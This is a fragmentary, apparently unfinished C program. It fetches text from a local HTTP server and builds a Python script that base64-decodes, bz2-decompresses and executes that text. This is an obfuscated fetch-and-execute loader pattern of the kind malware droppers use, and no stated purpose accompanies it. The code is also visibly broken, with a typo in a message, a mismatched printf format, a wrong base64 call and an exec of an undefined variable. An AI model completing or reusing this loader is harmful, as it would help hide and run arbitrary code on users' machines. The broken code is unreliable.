...
int main(int argc, char *argv[]) {
	TEXT output = "";
	http_get("127.0.0.1", 5000, "/tuby/_", output, HTTP_CONTENT_MAXSIZE);
	printf("adter get");
	...
	int count = 0;
	int stop = 0;
	printf("output: %s", strlen(output));
	TEXT script = txt_init("import bz2, base64\n");
	txt_concat(script, "bz2.decompress(base64.decode(\"");
	txt_concat(script, output);
	txt_concat(script, "\"))\n");
	txt_concat(script, "exec(script)");
//	char pythonScript[] =
//		"import bz2, base64\n"\
